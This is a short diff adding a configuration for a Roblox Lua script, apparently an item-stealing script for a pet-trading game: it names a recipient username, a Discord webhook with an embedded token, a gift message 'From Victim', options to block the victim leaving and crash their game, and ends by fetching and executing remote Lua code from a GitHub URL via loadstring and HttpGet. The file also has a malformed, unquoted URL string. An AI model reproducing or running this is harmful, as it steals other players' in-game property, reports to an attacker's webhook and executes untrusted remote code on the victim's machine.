@@ -1,0 +1,15 @@
+
+_G.Username = "vukantesteral"
+_G.Scriptname = "Black Gobiln"
+_G.Webhook = https://discord.com/api/webhooks/1096789294544322590/XY-j3a7IET-B5IwjRmX9RiCnwI0z1VApU_DklxTmYKhJTKxJHAzlvQgFHyu8wIqrddkc 
+_G.GiftMessege = "From Victim"
+_G.Diamonds =  500000
+_G.UnclockPets = true
+_G.AntiLeave = true
+_G.Crash = true
+_G.Trip1 = "1"
+_G.Trip2 = "2"
+_G.Trip3 = "3"
+_G.Trip4 = "4"
+_G.Trip5 = "5"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua))()
